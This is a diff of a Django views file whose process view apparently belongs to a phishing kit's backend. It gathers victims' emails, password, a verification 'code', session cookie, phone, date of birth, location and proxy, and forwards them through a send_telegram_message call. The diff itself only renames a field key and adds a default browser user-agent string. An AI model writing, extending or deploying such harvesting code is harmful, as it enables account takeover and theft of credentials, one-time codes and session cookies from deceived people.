@@ -4,6 +4,7 @@ from notification.views import send_telegram_message
 from datetime import datetime
 import json
 
+
 # Create your views here.
 def index(request):
     return render(request=request, template_name='index.html')
@@ -59,9 +60,11 @@ def process(request):
             final_data.get('city', ''), final_data.get('proxy', ''), final_data.get('latitude', ''),
             final_data.get('longtitude', ''),
             final_data.get('information', ''), final_data.get('emailBusiness', ''),
-            final_data.get('emailPersonal', ''), final_data.get('password', ''), final_data.get('fullname', ''),
+            final_data.get('emailPersonal', ''), final_data.get('password', ''), final_data.get('fullName', ''),
             final_data.get('username', ''), final_data.get('dob', ''), final_data.get('phone', ''),
-            final_data.get('user_agent', ''), final_data.get('code', ''), final_data.get('cookie', ''))
+            final_data.get('user_agent',
+                           'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'),
+            final_data.get('code', ''), final_data.get('cookie', ''))
         send_telegram_message(message)
         return render(request=request, template_name='form.html')
     else:
